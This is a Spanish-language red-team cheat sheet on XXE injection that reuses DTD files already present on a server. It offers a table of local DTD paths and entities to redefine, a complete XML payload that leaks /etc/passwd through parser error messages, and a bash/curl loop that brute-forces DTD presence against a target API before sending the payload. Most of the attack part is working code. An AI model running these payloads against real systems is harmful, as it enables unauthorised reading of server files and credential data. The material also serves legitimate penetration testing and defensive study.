---
aliases: null
tags:
  - vuln/xxe
  - technique/execution
  - asset/web-app
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
  - "[[Web]]"
tertiary categories:
  - '[[Web Explotación]]'
kind: SubCheatSheet
linked:
  - '[[XML External Entity (XXE)]]'
---
# XXE - DTDs Locales

***

## Cheatsheet

| **DTD local target** | **Entidad parámetro a redefinir** | **Cuándo** |
|:---:|:---:|:---:|
| `file:///usr/share/yelp/dtd/docbookx.dtd` | `ISOamso` | Linux con GNOME / yelp instalado. |
| `file:///usr/share/xml/fontconfig/fonts.dtd` | `constant` | Debian/Ubuntu con fontconfig. |
| `file:///usr/share/dbus-1/interfaces/org.freedesktop.DBus.xml` (XML, no DTD válido) | n/a | Probe de presencia — no redefinible. |
| `file:///C:/Windows/System32/wbem/xml/cim20.dtd` | `ParamType` | Windows con WMI. |
| `file:///opt/IBM/WebSphere/AppServer/properties/sdo/eis/eis-binding.dtd` | varies | Java WebSphere. |
| `jar:file:///path/to/app.jar!/META-INF/resources/foo.dtd` | varies | Java con jars cargados. |
^xxe-dtds-locales

### Payload genérico (redefiniendo `ISOamso` de docbookx)

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<foo/>
```

### Workflow rápido

```bash
# 1. Brute-force descubrimiento de DTDs locales presentes
for dtd in \
    "file:///usr/share/yelp/dtd/docbookx.dtd" \
    "file:///usr/share/xml/fontconfig/fonts.dtd" \
    "file:///opt/IBM/WebSphere/properties/sdo/eis/eis-binding.dtd" \
    "file:///C:/Windows/System32/wbem/xml/cim20.dtd"; do
  RES=$(curl -s -X POST https://target/api -H 'Content-Type: application/xml' --data \
    "<!DOCTYPE foo [<!ENTITY % d SYSTEM \"$dtd\"> %d;]><foo/>")
  # Si no hay error de "cannot resolve" → DTD existe
  echo "$dtd: $(echo $RES | head -c 200)"
done

# 2. Una vez identificado un DTD presente — usar payload con redefinición de su entidad
curl -X POST https://target/api -H 'Content-Type: application/xml' --data @local_dtd_payload.xml
```

### Lista referencia GTFOXXE

Ver [GTFOXXE](https://github.com/GoSecure/dtd-finder) — `dtd-finder` enumera DTDs en imágenes Docker y devuelve entity-parameter candidates.

___

## Overview

Cuando el egress saliente está bloqueado **y** el backend no devuelve errores verbose con datos externos, se reutiliza un DTD **ya presente en el filesystem del servidor**. El DTD legítimo se invoca como si fuera externo (con `file://`), y se redefine una de sus entidades de parámetro para inyectar la lógica `%file → %eval → %error`.

### Mecanismo

1. **`%local_dtd`** carga un DTD del filesystem (ej. `docbookx.dtd`).
2. **Redefinir una entidad de parámetro** declarada en ese DTD (ej. `%ISOamso`) con la lógica de blind error.
3. Al expandirse el DTD local, el parser evalúa la redefinición → arroja error con el archivo embebido.

### Por qué funciona

La especificación XML prohíbe entity-defining-entity en el subset DTD **interno** del documento, pero la regla **no aplica** dentro de DTDs externos. Cualquier DTD cargado vía `SYSTEM` cuenta como externo — incluso uno local en `/usr/share/`.

### Limitaciones

- **Descubrimiento de DTDs presentes:** requiere fuerza bruta. Sin error de "cannot resolve" = DTD existe.
- **Errores verbose obligatorios:** sin reflejo del error de parser → no hay exfil (mismo problema que [[XXE - Blind Basado en Errores]]).
- **Encoding correcto:** `%` debe ser `&#x25;`, `&` debe ser `&#x26;`, `'` debe ser `&#x27;` dentro de la entidad redefinida.

***
